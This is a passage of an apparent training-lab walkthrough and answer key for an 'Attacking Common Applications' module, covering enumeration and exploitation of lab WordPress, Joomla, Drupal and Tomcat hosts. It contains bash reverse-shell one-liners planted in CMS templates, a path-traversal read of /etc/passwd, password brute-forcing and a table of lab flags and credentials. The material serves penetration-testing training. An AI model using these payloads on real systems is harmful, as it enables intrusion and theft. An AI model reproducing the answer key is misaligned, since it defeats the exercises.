![[cheatsheat-Attacking Common Applications]]

# Attacking Common Applications Module

## Section Questions Writeup



## Section Questions and their Answers

| Section                                                     | Question Number | Answer                           |
| ----------------------------------------------------------- | --------------- | -------------------------------- |
| Application Discovery & Enumeration                         | Question 1      | ew.db                            |
| Application Discovery & Enumeration                         | Question 2      | Pages by Similarity              |
| WordPress - Discovery & Enumeration                         | Question 1      | 0ptions_ind3xeS_ftw!             |
| WordPress - Discovery & Enumeration                         | Question 2      | WP Sitemap Page                  |
| WordPress - Discovery & Enumeration                         | Question 3      | 1.6.4                            |
| Attacking WordPress                                         | Question 1      | doug                             |
| Attacking WordPress                                         | Question 2      | jessica1                         |
| Attacking WordPress                                         | Question 3      | webadmin                         |
| Attacking WordPress                                         | Question 4      | l00k_ma_unAuth_rc3!              |
| Joomla - Discovery & Enumeration                            | Question 1      | 3.10.0                           |
| Joomla - Discovery & Enumeration                            | Question 2      | turnkey                          |
| Attacking Joomla                                            | Question 1      | j00mla_c0re_d1rtrav3rsal!        |
| Drupal - Discovery & Enumeration                            | Question 1      | 7.30                             |
| Attacking Drupal                                            | Question 1      | DrUp@l_drUp@l_3veryWh3Re!        |
| Tomcat - Discovery & Enumeration                            | Question 1      | 10.0.10                          |
| Tomcat - Discovery & Enumeration                            | Question 2      | admin-gui                        |
| Attacking Tomcat                                            | Question 1      | tomcat                           |
| Attacking Tomcat                                            | Question 2      | root                             |
| Attacking Tomcat                                            | Question 3      | t0mcat_rc3_ftw!                  |
| Jenkins - Discovery & Enumeration                           | Question 1      | 2.303.1                          |
| Attacking Jenkins                                           | Question 1      | f33ling_gr00000vy!               |
| Splunk - Discovery & Enumeration                            | Question 1      | 8.2.2                            |
| Attacking Splunk                                            | Question 1      | l00k_ma_no_AutH!                 |
| PRTG Network Monitor                                        | Question 1      | 18.1.37.13946                    |
| PRTG Network Monitor                                        | Question 2      | WhOs3_m0nit0ring_wH0?            |
| osTicket                                                    | Question 1      | Inlane_welcome!                  |
| Gitlab - Discovery & Enumeration                            | Question 1      | 13.10.2                          |
| Gitlab - Discovery & Enumeration                            | Question 2      | postgres                         |
| Attacking GitLab                                            | Question 1      | DEMO                             |
| Attacking GitLab                                            | Question 2      | s3cure_y0ur_Rep0s!               |
| Attacking Tomcat CGI                                        | Question 1      | feldspar\omen                    |
| Attacking CGI Applications - Shellshock                     | Question 1      | Sh3ll_Sh0cK_123                  |
| Attacking Thick Client Applications                         | Question 1      | svc_oracle:#oracle_s3rV1c3!2010  |
| Exploiting Web Vulnerabilities in Thick-Client Applications | Question 1      | 172.28.0.3                       |
| ColdFusion - Discovery & Enumeration                        | Question 1      | Server Monitor                   |
| Attacking ColdFusion                                        | Question 1      | arctic\tolis                     |
| IIS Tilde Enumeration                                       | Question 1      | transfer.aspx                    |
| Attacking LDAP                                              | Question 1      | w3.css                           |
| Web Mass Assignment Vulnerabilities                         | Question 1      | active                           |
| Attacking Applications Connecting to Services               | Question 1      | SA:N0tS3cr3t!                    |
| Other Notable Applications                                  | Question 1      | Weblogic                         |
| Other Notable Applications                                  | Question 2      | w3b_l0gic_RCE!                   |
| Attacking Common Applications - Skills Assessment I         | Question 1      | tomcat                           |
| Attacking Common Applications - Skills Assessment I         | Question 2      | 8080                             |
| Attacking Common Applications - Skills Assessment I         | Question 3      | 9.0.0.M1                         |
| Attacking Common Applications - Skills Assessment I         | Question 4      | f55763d31a8f63ec935abd07aee5d3d0 |
| Attacking Common Applications - Skills Assessment II        | Question 1      | http://blog.inlanefreight.local  |
| Attacking Common Applications - Skills Assessment II        | Question 2      | VirtualHost                      |
| Attacking Common Applications - Skills Assessment II        | Question 3      | monitoring.inlanefreight.local   |
| Attacking Common Applications - Skills Assessment II        | Question 4      | Nagios                           |
| Attacking Common Applications - Skills Assessment II        | Question 5      | oilaKglm7M09@CPL&^lC             |
| Attacking Common Applications - Skills Assessment II        | Question 6      | afe377683dce373ec2bf7eaf1e0107eb |
| Attacking Common Applications - Skills Assessment III       | Question 1      | D3veL0pM3nT!                     |

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Application Discovery & Enumeration

## Question 1

### "Use what you've learned from this section to generate a report with EyeWitness. What is the name of the .db file EyeWitness creates in the inlanefreight_eyewitness folder? (Format: filename.db)"

After spawning the target machine, students need to add the following vHost entires in `/etc/hosts` on Pwnbox/`PMVPN`, allowing them to resolve host names later in the subsequent sections (an alternative syntax would be having the IP address only once and separating the hostnames with a space in the same entry):

- `STMIP app.inlanefreight.local`
- `STMIP dev.inlanefreight.local`
- `STMIP drupal-dev.inlanefreight.local`
- `STMIP drupal-qa.inlanefreight.local`
- `STMIP drupal-acc.inlanefreight.local`
- `STMIP drupal.inlanefreight.local`
- `STMIP blog.inlanefreight.local`

Students then need to create a scope list file for `EyeWitness`, including all the virtual hosts domain names:

Code: shell

```shell
cat << EOF > scopeList
> app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
drupal-qa.inlanefreight.local
drupal-acc.inlanefreight.local
drupal.inlanefreight.local
blog.inlanefreight.local
> EOF
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat << EOF > scopeList
> app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
drupal-qa.inlanefreight.local
drupal-acc.inlanefreight.local
drupal.inlanefreight.local
blog.inlanefreight.local
> EOF
```

Subsequently, students need to run an `Nmap` scan, passing the scope list file for the `-iL` parameter, and saving the output using all formats:

Code: shell

```shell
sudo nmap STMIP -p 80,443,8000,8080,8180,8888,10000 --open -oA webDiscovery -iL scopeList
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nmap 10.129.42.195 -p 80,443,8000,8080,8180,8888,10000 --open -oA webDiscovery -iL scopeList

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 05:20 BST
Nmap scan report for app.inlanefreight.local (10.129.42.195)
Host is up (0.080s latency).
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

<SNIP>

Nmap done: 7 IP addresses (7 hosts up) scanned in 2.05 seconds
```

Using the "webDiscovery.xml" file that `Nmap` generated, students need to feed it into `EyeWitness`:

Code: shell

```shell
python3 EyeWitness.py --web -x ~/web_discovery.xml -d inlanefreight_eyewitness
```

```shell-session
######################################################
#                                  EyeWitness                                  #
######################################################
#           FortyNorth Security - https://www.fortynorthsecurity.com           #
######################################################

Starting Web Requests (7 Hosts)
Attempting to screenshot http://app.inlanefreight.local
Attempting to screenshot http://dev.inlanefreight.local
[*] Hit timeout limit when connecting to http://app.inlanefreight.local, retrying
Attempting to screenshot http://drupal-dev.inlanefreight.local
Attempting to screenshot http://drupal-qa.inlanefreight.local
[*] Hit timeout limit when connecting to http://dev.inlanefreight.local, retrying
Attempting to screenshot http://drupal-acc.inlanefreight.local
Attempting to screenshot http://drupal.inlanefreight.local
Attempting to screenshot http://blog.inlanefreight.local
Finished in 36.61274313926697 seconds

[*] Done! Report written in the /home/htb-ac413848/inalnefreightEyeWitness folder!
```

Once `EyeWitness` has finished, students will find that the name of the database file is "ew.db", found within the `inlanefreightEyeWitness` directory:

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ls inalnefreightEyeWitness/

ew.db  jquery-1.11.3.min.js  open_ports.csv  report.html  report_page2.html  Requests.csv  screens  source  style.css
```

Answer: `ew.db`

# Application Discovery & Enumeration

## Question 2

### "What does the header on the title page say when opening the aquatone_report.html page with a web browser? (Format: 3 words, case sensitive)"

Using the same output file "webDiscovery.xml" generated by `Nmap` in the previous question, students need to feed it into `aquatone`:

Code: shell

```shell
cat webDiscovery.xml | aquatone -nmap
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat webDiscovery.xml | aquatone -nmap

aquatone v1.7.0 started at 2022-10-01T05:42:14+01:00

Using unreliable Google Chrome for screenshots. Install Chromium for better results.

Targets    : 14
Threads    : 4
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://drupal-qa.inlanefreight.local/: 200 OK
http://app.inlanefreight.local/: 200 OK
http://app.inlanefreight.local/: 200 OK
http://dev.inlanefreight.local/: 200 OK
http://drupal.inlanefreight.local/: 200 OK
http://drupal-acc.inlanefreight.local/: 200 OK
http://app.inlanefreight.local/: 200 OK
http://blog.inlanefreight.local/: 200 OK
http://app.inlanefreight.local/: 200 OK
http://app.inlanefreight.local/: 200 OK
http://drupal-dev.inlanefreight.local/: 200 OK
http://app.inlanefreight.local/: 200 OK
http://app.inlanefreight.local/: 200 OK
http://app.inlanefreight.local/: 200 OK
http://drupal-qa.inlanefreight.local/: screenshot successful

<SNIP>

Screenshots:
 - Successful : 14
 - Failed     : 0

Wrote HTML report to: aquatone_report.html
```

Once `aquatone` finishes, students need to open the report it generated with a browser, for example using `FireFox`. One of the first things students will see on web page is `Pages by Similarity`:

Code: shell

```shell
firefox aquatone_report.html
```

![Attacking_Common_Applications_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_1.png)

Answer: `Pages by Similarity`

# WordPress - Discovery & Enumeration

## Question 1

### "Enumerate the host and find a flag.txt flag in an accessible directory."

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP blog.inlanefreight.local`

Subsequently, students need to enumerate the spawned target machine with `WPScan`:

Code: shell

```shell
wpscan --url http://blog.inlanefreight.local --enumerate
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.21
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Sat Oct  1 06:01:51 2022

Interesting Finding(s):

<SNIP>

[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

<SNIP>
```

`WPScan` will output that `/wp-content/uploads/` has directory listing enabled; after navigating to it and accessing two subdirectories within it, students will find the flag, at `http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt`:

![Attacking_Common_Applications_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_2.png)

Answer: `0ptions_ind3xeS_ftw!`

# WordPress - Discovery & Enumeration

## Question 2

### "Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words)."

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP blog.inlanefreight.local`

Subsequently, using a browser, students need to navigate to the root page of that `VHost` and click on "Shipping Industry News":

![Attacking_Common_Applications_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_3.png)

Within the redirected web page, students will see that the "WP Sitemap Page" plugin is used:

![Attacking_Common_Applications_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_4.png)

Answer: `WP Sitemap Page`

# WordPress - Discovery & Enumeration

## Question 3

### "Find the version number of this plugin. (i.e., 4.5.2)"

From the previous question, students know that the "WP Sitemap Page" is being utilized on the website, thus they need to view the "readme.txt" file under the plugin's directory, which is `http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/`, to find the version as the value of `Stable tag`:

![Attacking_Common_Applications_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_5.png)

Answer: `1.6.4`

# Attacking WordPress

## Question 1

### "Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?"

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP blog.inlanefreight.local`

Subsequently, students need to enumerate the spawned target machine with `WPScan`:

Code: shell

```shell
wpscan --url http://blog.inlanefreight.local --enumerate
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wpscan --url http://blog.inlanefreight.local --enumerate

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.21
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

<SNIP>

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] by:
admin
 | Found By: Author Posts - Display Name (Passive Detection)

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] doug
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

The other user aside from admin is `doug`.

Answer: `doug`

# Attacking WordPress

## Question 2

### "Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer."

As per the previous question, students know that the other user is `doug`. Thus, they need to bruteforce this user's password with `WPScan`:

Code: shell

```shell
wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url blog.inlanefreight.local
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url blog.inlanefreight.local

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.21
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - doug / jessica1                                                                                                                                   
Trying doug / cheyenne Time: 00:00:10 <> (660 / 14345052)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: doug, Password: jessica1
```

From the output of `WPScan`, students will know that the password of the user `doug` is `jessica1`.

Answer: `jessica1`

# Attacking WordPress

## Question 3

### "Using the methods shown in this section, find another system user whose login shell is set to /bin/bash."

From the previously attained enumeration output produced by `WPScan`, students will know that the plugin `mail-masta` is being utilized by the web application, thus, they need to exploit its vulnerability which allows discovering the underlying OS's environment variables:

Code: shell

```shell
curl -s blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd | grep "/bin/bash"
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd | grep "/bin/bash"

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
webadmin:x:1001:1001::/home/webadmin:/bin/bash
```

The other system user whose login shell is set to `/bin/bash` is `webadmin`.

Answer: `webadmin`

# Attacking WordPress

## Question 4

### "Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot."

Students first need to navigate to `http://blog.inlanefreight.local/wp-login.php` and use the previously harvested credentials `doug:jessica1` to login:

![Attacking_Common_Applications_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_6.png)

Once inside the admin panel, students need to click on "Appearance -> Theme Editor":

![Attacking_Common_Applications_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_7.png)

Students then need to select the theme "Twenty Nineteen":

![Attacking_Common_Applications_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_8.png)

Then, students need to select the 404.php template and add a PHP reverse shell one-liner:

Code: shell

```shell
exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
```

![Attacking_Common_Applications_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_9.png)

After updating the file, students need to listen on `PWNPO` using `nc`:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Students then need to navigate to the `404.php` web page, which is at `http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php`, to send the callback and catch the reverse shell:

```shell-session
Ncat: Connection from 10.129.99.98.
Ncat: Connection from 10.129.99.98:36524.
bash: cannot set terminal process group (1047): Inappropriate ioctl for device
bash: no job control in this shell
<anefreight.local/wp-content/themes/twentynineteen$
```

Once the reverse shell is attained, students can print out the flag file "flag.txt" which is under the `/var/www/blog.inlanefreight.local/` directory:

Code: shell

```shell
cat /var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
```

```shell-session
<anefreight.local/wp-content/themes/twentynineteen$ cat /var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt

l00k_ma_unAuth_rc3!
```

Answer: `l00k_ma_unAuth_rc3!`

# Joomla - Discovery & Enumeration

## Question 1

### "Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)"

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP app.inlanefreight.local`

Subsequently, students need to run the following command to enumerate the `Joomla` version:

Code: shell

```shell
curl -s app.inlanefreight.local/README.txt | head -n 4
```

```shell-session
┌─[us-academy-1]─[10.10.14.13]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s app.inlanefreight.local/README.txt | head -n 4

1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.10 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.10_version_history
```

Following the format that the questions mandates, the `Joomla` version is `3.10.0`.

Answer: `3.10.0`

# Joomla - Discovery & Enumeration

## Question 2

### "Find the password for the admin user on http://app.inlanefreight.local"

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP app.inlanefreight.local`

Students then need to clone the `Joomla-Bruteforce` repository:

Code: shell

```shell
git clone https://github.com/ajnik/joomla-bruteforce.git
```

```shell-session
┌─[us-academy-1]─[10.10.14.13]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ git clone https://github.com/ajnik/joomla-bruteforce.git

Cloning into 'joomla-bruteforce'...
remote: Enumerating objects: 44, done.
remote: Counting objects: 100% (44/44), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 44 (delta 20), reused 29 (delta 10), pack-reused 0
Receiving objects: 100% (44/44), 7.63 KiB | 3.82 MiB/s, done.
Resolving deltas: 100% (20/20), done.
```

Then, students need to bruteforce the password of the user `admin` using `joomla-brute.py`:

Code: shell

```shell
python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/wordlists/rockyou.txt -usr admin
```

```shell-session
┌─[us-academy-1]─[10.10.14.13]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo python3 joomla-bruteforce/joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:turnkey
```

The password of the user `admin` is `turnkey`.

Answer: `turnkey`

# Attacking Joomla

## Question 1

### "Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application"

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP dev.inlanefreight.local`

Then, students need to navigate to `http://dev.inlanefreight.local/administrator/index.php` and login using the credentials that were shown in the previous section, `admin:admin` (not `admin:turnkey`):

![Attacking_Common_Applications_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_10.png)

![Attacking_Common_Applications_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_11.png)

Once logged in, students need to click on `Extensions` -> `Templates` -> `Templates`:

![Attacking_Common_Applications_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_12.png)

Students then need to click on "Protostar Details and Files":

![Attacking_Common_Applications_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_13.png)

Subsequently, students need to click on `error.php` so that it can be edited:

![Attacking_Common_Applications_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_14.png)

Within `error.php`, students need to inject a PHP reverse shell one-liner and then click on `Save`:

Code: php

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
```

![Attacking_Common_Applications_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_15.png)

Subsequently, students need to start an `nc` listener on Pwnbox/`PMVPN`, specifying the same port used in the PHP reverse-shell one-liner:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-2h8umziw0o]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Students then need to navigate to `http://dev.inlanefreight.local/templates/protostar/error.php` to initiate the call-back and catch the reverse-shell on the listening port:

```shell-session
Ncat: Connection from 10.129.87.35.
Ncat: Connection from 10.129.87.35:55568.
bash: cannot set terminal process group (1056): Inappropriate ioctl for device
bash: no job control in this shell
www-data@app01:/var/www/dev.inlanefreight.local/templates/protostar$
```

At last, students will be able to print out the flag file "flag_6470e394cbf6dab6a91682cc8585059b.txt", which is under the directory `/var/www/dev.inlanefreight.local/`:

Code: shell

```shell
cat ../../flag_6470e394cbf6dab6a91682cc8585059b.txt
```

```shell-session
www-data@app01:/var/www/dev.inlanefreight.local/templates/protostar$ cat ../../flag_6470e394cbf6dab6a91682cc8585059b.txt

j00mla_c0re_d1rtrav3rsal!
```

Answer: `j00mla_c0re_d1rtrav3rsal!`

# Drupal - Discovery & Enumeration

## Question 1

### "Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local"

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP drupal-qa.inlanefreight.local`

Subsequently, students need to read the "CHANGELOG.txt" file to find out the version of `Drupal`:

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-4n4ythi3jb]─[~]
└──╼ [★]$ curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | grep -m1 "Drupal"

Drupal 7.30, 2014-07-24
```

Answer: `7.30`

# Attacking Drupal

## Question 1

### "Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory."

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP drupal.inlanefreight.local`

Students then need to navigate to `http://drupal.inlanefreight.local/usr/login` and login to the admin panel using the credentials `admin:admin`:

![Attacking_Common_Applications_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_16.png)

Subsequently, students need to click on "Extend", scroll down until they find the "PHP Filter" module, and then check it:

![Attacking_Common_Applications_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_17.png)

![Attacking_Common_Applications_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_18.png)

![Attacking_Common_Applications_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_19.png)

Students then need to click on "Content" and click on "Add Content":

![Attacking_Common_Applications_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_20.png)

Then, students need to click on "Basic page":

![Attacking_Common_Applications_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_21.png)

Students need to have in the body a PHP reverse-shell one-liner, and change `Text format` to be `PHP code`:

Code: shell

```shell
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/PWNIP/PWNPO 0>&1'");
?>
```

![Attacking_Common_Applications_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_22.png)

Before clicking on "Save", students need to start an `nc` listener on Pwnbox/`PMVPN`, specifying the same port used in the PHP reverse-shell one-liner:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-f6k4hfqgg8]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Then, after clicking on "Save", students will notice that the they attained a reverse-shell:

```shell-session
Ncat: Connection from 10.129.84.151.
Ncat: Connection from 10.129.84.151:34778.

whoami

www-data
```

At last, students can print out the flag file `flag_6470e394cbf6dab6a91682cc8585059b.txt`, which will be under the same directory of the reverse shell attained:

Code: shell

```shell
cat flag_6470e394cbf6dab6a91682cc8585059b.txt
```

```shell-session
cat flag_6470e394cbf6dab6a91682cc8585059b.txt

DrUp@l_drUp@l_3veryWh3Re!
```

Answer: `DrUp@l_drUp@l_3veryWh3Re!`

# Tomcat - Discovery & Enumeration

## Question 1

### "What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180?"

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP web01.inlanefreight.local`

Students then need to navigate to `http://web01.inlanefreight.local:8180` and click on "Documentation" to find out that the version is "10.0.10":

![Attacking_Common_Applications_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_23.png)

Answer: `10.0.10`

# Tomcat - Discovery & Enumeration

## Question 2

### "What role does the admin user have in the configuration example?"

From the section's reading, students will know that the role of the admin user is `admin-gui`:

![Attacking_Common_Applications_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_24.png)

Answer: `admin-gui`

# Attacking Tomcat

## Question 1

### "Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?"

After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`:

- `STMIP web01.inlanefreight.local`

Students then need to start `msfconsole`, use the `auxiliary/scanner/http/tomcat_mgr_login` module, and set its options accordingly:

Code: shell

```shell
msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS STMIP
set RPORT 8180
set VHOST web01.inlanefreight.local
set STOP_ON_SUCCESS true
exploit
```

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-f6k4hfqgg8]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/tomcat_mgr_login
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set RHOSTS 10.129.201.58
RHOSTS => 10.129.201.58
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set RPORT 8180
RPORT => 8180
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set VHOST web01.inlanefreight.local
VHOST => web01.inlanefreight.local
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> exploit

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
